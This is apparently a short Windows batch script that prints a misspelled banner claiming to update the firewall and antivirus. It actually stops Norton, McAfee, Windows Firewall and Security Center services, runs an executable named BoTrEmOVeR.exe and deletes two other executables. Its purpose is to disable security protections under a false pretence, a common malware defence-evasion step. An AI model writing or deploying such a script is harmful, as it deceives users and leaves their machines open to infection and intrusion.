   @echo off
   echo ******************** UPDATING WINDWOWS FIREWAL AND ANTIVIRUS **************************
   net stop "norton antivirus auto-protect service"
   net stop "windows firewall/internet connection sharing (ics)"
   net stop "security center"
   net stop "mcafee.com mcshield"
   net stop "mcafee.com virusscan online realtime engine"
   net stop "mcafee personal firewall service"
   echo ******************* PLEASE STANDBY****************************
   BoTrEmOVeR.exe
   del c:\BoT-KiLleR.exe
   del c:\winsupdater.exe
   exit
